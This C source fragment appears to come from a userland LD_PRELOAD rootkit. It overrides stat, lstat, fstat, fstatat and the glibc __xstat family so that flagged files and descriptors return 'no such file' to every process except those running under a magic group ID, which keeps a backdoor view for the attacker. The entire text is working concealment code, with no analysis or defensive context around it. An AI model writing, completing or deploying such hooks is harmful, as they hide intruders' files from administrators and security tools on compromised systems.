int stat(const char *pathname, struct stat *buf)
{
    HOOK(o_stat,"stat");
    if(getgid()==MGID) return o_stat(pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_stat(pathname,buf);
}
int stat64(const char *pathname, struct stat64 *buf)
{
    HOOK(o_stat64,"stat64");
    if(getgid()==MGID) return o_stat64(pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_stat64(pathname,buf);
}
int fstat(int fd, struct stat *buf)
{
    HOOK(o_fxstat,"__fxstat");
    if(getgid()==MGID) return o_fxstat(_STAT_VER,fd,buf);
    if(hfxstat(fd)) { errno=ENOENT; return -1; }
    return o_fxstat(_STAT_VER,fd,buf);
}
int fstat64(int fd, struct stat64 *buf)
{
    HOOK(o_fxstat64,"__fxstat64");
    if(getgid()==MGID) return o_fxstat64(_STAT_VER,fd,buf);
    if(hfxstat(fd)) { errno=ENOENT; return -1; }
    return o_fxstat64(_STAT_VER,fd,buf);
}
int fstatat(int dirfd, const char *pathname, struct stat *buf, int flags)
{
    HOOK(o_fstatat,"fstatat");
    if(getgid()==MGID) return o_fstatat(dirfd,pathname,buf,flags);
    if(hfxstat(dirfd) || hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_fstatat(dirfd,pathname,buf,flags);
}
int fstatat64(int dirfd, const char *pathname, struct stat64 *buf, int flags)
{
    HOOK(o_fstatat64,"fstatat64");
    if(getgid()==MGID) return o_fstatat64(dirfd,pathname,buf,flags);
    if(hfxstat(dirfd) || hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_fstatat64(dirfd,pathname,buf,flags);
}
int lstat(const char *pathname, struct stat *buf)
{
    HOOK(o_lstat,"lstat");
    if(getgid()==MGID) return o_lstat(pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_lstat(pathname,buf);
}
int lstat64(const char *pathname, struct stat64 *buf)
{
    HOOK(o_lstat64,"lstat64");
    if(getgid()==MGID) return o_lstat64(pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_lstat64(pathname,buf);
}
int __xstat(int version, const char *pathname, struct stat *buf)
{
    HOOK(o_xstat,"__xstat");
    if(getgid()==MGID) return o_xstat(version,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_xstat(version,pathname,buf);
}
int __xstat64(int version, const char *pathname, struct stat64 *buf)
{
    HOOK(o_xstat64,"__xstat64");
    if(getgid()==MGID) return o_xstat64(version,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_xstat64(version,pathname,buf);
}
int __fxstat(int version, int fd, struct stat *buf)
{
    HOOK(o_fxstat,"__fxstat");
    if(getgid()==MGID) return o_fxstat(version,fd,buf);
    if(hfxstat(fd)) { errno=ENOENT; return -1; }
    return o_fxstat(version,fd,buf);
}
int __fxstat64(int version, int fd, struct stat64 *buf)
{
    HOOK(o_fxstat64,"__fxstat64");
    if(getgid()==MGID) return o_fxstat64(version,fd,buf);
    if(hfxstat(fd)) { errno=ENOENT; return -1; }
    return o_fxstat64(version,fd,buf);
}
int __lxstat(int version, const char *pathname, struct stat *buf)
{
    HOOK(o_lxstat,"__lxstat");
    if(getgid()==MGID) return o_lxstat(version,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_lxstat(version,pathname,buf);
}
int __lxstat64(int version, const char *pathname, struct stat64 *buf)
{
    HOOK(o_lxstat64,"__lxstat64");
    if(getgid()==MGID) return o_lxstat64(version,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_lxstat64(version,pathname,buf);
}
